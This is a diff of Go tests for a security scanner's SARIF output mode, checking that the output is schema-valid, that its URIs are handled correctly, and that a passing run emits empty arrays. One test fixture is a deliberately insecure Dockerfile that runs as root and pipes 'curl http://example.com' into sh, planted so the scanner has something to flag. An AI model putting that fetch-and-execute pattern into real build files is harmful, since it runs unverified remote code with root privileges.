@@ -8,6 +8,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/namncqualgo/skills-library/internal/tools"
 )
 
 // repoRootForTest walks up from CWD until it finds go.mod, mirroring
@@ -357,5 +359,159 @@ func TestPolicyFailureSentinelIsDistinguishable(t *testing.T) {
 	want := "gate: 3 finding(s) at or above high"
 	if got := err.Error(); got != want {
 		t.Errorf("Error() = %q, want %q", got, want)
+	}
+}
+
+// TestGateSARIFOnFailingFile locks the contract for `gate --format
+// sarif`: stdout is a schema-valid SARIF 2.1.0 document carrying the
+// planted finding, AND the command still exits non-zero. The SARIF is
+// written before the failure sentinel is returned, so a CI step can
+// both fail the build and upload-sarif the findings in one invocation.
+func TestGateSARIFOnFailingFile(t *testing.T) {
+	const docker = `FROM node:latest
+USER root
+RUN curl http://example.com | sh
+`
+	path := writeFixedNameFixture(t, "Dockerfile", docker)
+	out, _, err := run(t,
+		"gate",
+		"--path", repoRootForTest(t),
+		"--severity-floor", "high",
+		"--format", "sarif",
+		path,
+	)
+	// Exit code preserved: a failing gate must still signal failure.
+	if err == nil {
+		t.Fatalf("gate --format sarif did not signal failure for bad Dockerfile:\n%s", out)
+	}
+	if !IsPolicyFailure(err) {
+		t.Errorf("expected policy-failure sentinel, got %T: %v", err, err)
+	}
+	// Stdout must be a schema-valid SARIF 2.1.0 log carrying the finding.
+	var log tools.SARIFLog
+	if jerr := json.Unmarshal([]byte(out), &log); jerr != nil {
+		t.Fatalf("gate SARIF output is not valid JSON: %v\n%s", jerr, out)
+	}
+	if log.Version != "2.1.0" {
+		t.Errorf("SARIF version = %q, want 2.1.0", log.Version)
+	}
+	if log.Schema == "" {
+		t.Error("SARIF $schema is empty")
+	}
+	if len(log.Runs) != 1 {
+		t.Fatalf("want exactly 1 run, got %d", len(log.Runs))
+	}
+	if len(log.Runs[0].Results) == 0 {
+		t.Errorf("planted finding did not appear in SARIF results:\n%s", out)
+	}
+	if len(log.Runs[0].Tool.Driver.Rules) == 0 {
+		t.Errorf("SARIF rules table is empty; results cannot reference a rule:\n%s", out)
+	}
+	// Every result must reference a rule that exists in the table, and
+	// carry a non-empty message (SARIF 2.1.0 requires message.text).
+	for i, res := range log.Runs[0].Results {
+		if res.RuleIndex < 0 || res.RuleIndex >= len(log.Runs[0].Tool.Driver.Rules) {
+			t.Errorf("result %d ruleIndex %d out of range (rules=%d)",
+				i, res.RuleIndex, len(log.Runs[0].Tool.Driver.Rules))
+		}
+		if res.Message.Text == "" {
+			t.Errorf("result %d has empty message.text (invalid SARIF)", i)
+		}
+	}
+}
+
+// TestGateSARIFRelativeURIs locks the URI contract that GitHub Code
+// Scanning anchoring depends on (verified on a live fixture repo:
+// absolute file:// URIs ingest but render as dead paths; repo-relative
+// URIs anchor to the file). With --sarif-base pointing at the
+// directory containing the scanned file, the artifact URI must be the
+// bare relative path; without it (default cwd, which the temp fixture
+// lives outside of), the URI must fall back to an absolute file:// —
+// never a ../../ escape path.
+func TestGateSARIFRelativeURIs(t *testing.T) {
+	const docker = `FROM node:latest
+USER root
+`
+	path := writeFixedNameFixture(t, "Dockerfile", docker)
+
+	uriOf := func(out string) string {
+		t.Helper()
+		var log tools.SARIFLog
+		if err := json.Unmarshal([]byte(out), &log); err != nil {
+			t.Fatalf("not valid SARIF JSON: %v\n%s", err, out)
+		}
+		res := log.Runs[0].Results
+		if len(res) == 0 {
+			t.Fatalf("no results in SARIF:\n%s", out)
+		}
+		return res[0].Locations[0].PhysicalLocation.ArtifactLocation.URI
+	}
+
+	// --sarif-base = the fixture's dir → bare relative path.
+	out, _, err := run(t,
+		"gate",
+		"--path", repoRootForTest(t),
+		"--severity-floor", "high",
+		"--format", "sarif",
+		"--sarif-base", filepath.Dir(path),
+		path,
+	)
+	if err == nil {
+		t.Fatal("gate should fail on the planted Dockerfile")
+	}
+	if got := uriOf(out); got != "Dockerfile" {
+		t.Errorf("with --sarif-base, uri = %q, want %q", got, "Dockerfile")
+	}
+
+	// Default base (cwd) — fixture lives outside it → absolute
+	// file:// fallback, never a ../.. escape.
+	out, _, err = run(t,
+		"gate",
+		"--path", repoRootForTest(t),
+		"--severity-floor", "high",
+		"--format", "sarif",
+		path,
+	)
+	if err == nil {
+		t.Fatal("gate should fail on the planted Dockerfile")
+	}
+	if got := uriOf(out); !strings.HasPrefix(got, "file://") {
+		t.Errorf("outside-base uri = %q, want absolute file:// fallback", got)
+	} else if strings.Contains(got, "..") {
+		t.Errorf("outside-base uri %q contains a path escape", got)
+	}
+}
+
+// TestGateSARIFOnCleanFileIsWellFormed confirms a passing gate still
+// emits well-formed SARIF with empty-but-non-null results/rules arrays
+// (GitHub Advanced Security rejects the JSON `null` form) and exits 0.
+func TestGateSARIFOnCleanFileIsWellFormed(t *testing.T) {
+	clean := writeFixedNameFixture(t, "notes.txt", "nothing secret here\n")
+	out, _, err := run(t,
+		"gate",
+		"--path", repoRootForTest(t),
+		"--severity-floor", "high",
+		"--format", "sarif",
+		clean,
+	)
+	if err != nil {
+		t.Fatalf("gate --format sarif failed on clean file (unexpected): %v\n%s", err, out)
+	}
+	var log tools.SARIFLog
+	if jerr := json.Unmarshal([]byte(out), &log); jerr != nil {
+		t.Fatalf("clean-gate SARIF is not valid JSON: %v\n%s", jerr, out)
+	}
+	if log.Version != "2.1.0" || len(log.Runs) != 1 {
+		t.Fatalf("malformed SARIF skeleton: version=%q runs=%d", log.Version, len(log.Runs))
+	}
+	if len(log.Runs[0].Results) != 0 {
+		t.Errorf("clean gate should have 0 results, got %d", len(log.Runs[0].Results))
+	}
+	// Lock the null-avoidance contract GHAS depends on.
+	if !strings.Contains(out, `"results": []`) {
+		t.Errorf("results array serialised as null, not []:\n%s", out)
+	}
+	if !strings.Contains(out, `"rules": []`) {
+		t.Errorf("rules array serialised as null, not []:\n%s", out)
 	}
 }
